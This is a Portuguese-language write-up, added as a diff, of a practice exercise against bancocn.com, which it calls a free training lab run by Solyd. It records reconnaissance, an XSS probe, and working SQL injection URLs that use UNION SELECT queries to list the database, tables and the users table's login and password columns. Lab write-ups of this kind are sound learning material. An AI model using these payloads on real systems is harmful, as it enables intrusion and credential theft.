@@ -1,0 +1,66 @@
+# Relatório de Atividades em Cibersegurança
+
+## Laboratório
+
+- **Ambiente de Laboratório:**
+  - Descrição do ambiente de laboratório, incluindo o servidor Apache em bancocn.com, que é redefinido a cada 30 minutos.
+
+## Exploração do Site bancocn.com
+
+1. **Identificação do Site:**
+   - Identificação do site bancocn.com como um laboratório gratuito de cibersegurança oferecido pela Solyd, uma empresa brasileira de certificação.
+
+2. **Descoberta de Diretórios Acessíveis:**
+   - Descoberta de diretórios acessíveis, como bancocn.com/assets.
+
+3. **Página /admin no robots.txt:**
+   - Identificação de uma página /admin mencionada no arquivo robots.txt.
+
+4. **Análise do Código Fonte:**
+   - Ao analisar o código fonte de bancocn.com/admin/login.php, identificação da referência a uma imagem: ../images/key.png, indicando a existência do diretório images em http://www.bancocn.com/images/.
+
+## Exploração de cat.php com Injeção de SQL
+
+5. **Injeção de SQL - Parâmetro id:**
+   - Ao manipular o parâmetro id em cat.php, inserção de 1' OR 1=1 --, resultando em uma mensagem de erro de SQL.
+
+## Vulnerabilidade de Cross-Site Scripting (XSS)
+
+6. **Inserção de XSS na URL:**
+   - Inserção de <script>alert(1)</script> na URL https://www.bancocn.com/cat.php?id=1', resultando em uma mensagem de erro indicativa de possível vulnerabilidade de XSS.
+
+## Nova Descoberta: Injeção de SQL em Order By
+
+7. **Injeção de SQL - Order By:**
+   - Pesquisa de http://www.bancocn.com/cat.php?id=1%20order%20by%204, resultando em um novo erro: "Unknown column '4' in 'order clause", sugerindo a possibilidade de injeção de SQL na cláusula ORDER BY.
+
+## Tecnologias Relevantes Utilizadas no Site
+
+8. **Linguagem de Programação:**
+   - O site é implementado usando a linguagem de programação PHP 5.6.40.
+
+9. **Banco de Dados:**
+   - O banco de dados do site é alimentado pelo MySQL.
+
+10. **Bibliotecas JavaScript:**
+   - O site incorpora as bibliotecas JavaScript jQuery Migrate 1.4.1 e jQuery 1.12.4 para funcionalidades interativas.
+
+## Nova Descoberta: Nome do Banco de Dados
+
+11. **Nome do Banco de Dados:**
+    - Ao explorar a aplicação em http://www.bancocn.com/cat.php?id=-1%20UNION%20SELECT%201,2,database(), obtenção do nome do banco de dados, que é "bancocn".
+
+## Nova Descoberta: Listagem de Esquemas (Schemas)
+
+12. **Listagem de Esquemas:**
+    - Utilização da consulta http://www.bancocn.com/cat.php?id=-1%20UNION%20SELECT%201,2,group_concat(schema_name)%20from%20information_schema.schemata, obtendo os nomes dos esquemas: "bancocn" e "information_schema".
+
+## Nova Descoberta: Listagem de Tabelas no Esquema "bancocn"
+
+13. **Listagem de Tabelas:**
+    - Ao usar http://www.bancocn.com/cat.php?id=-1%20UNION%20SELECT%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22bancocn%22, obtenção das tabelas: categories, pictures, stats, users.
+
+## Nova Descoberta: Listagem de Colunas na Tabela "users"
+
+14. **Listagem de Colunas:**
+    - Utilizando http://www.bancocn.com/cat.php?id=-1%20UNION%20SELECT%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%22users%22, obtenção das colunas: id, login, password.
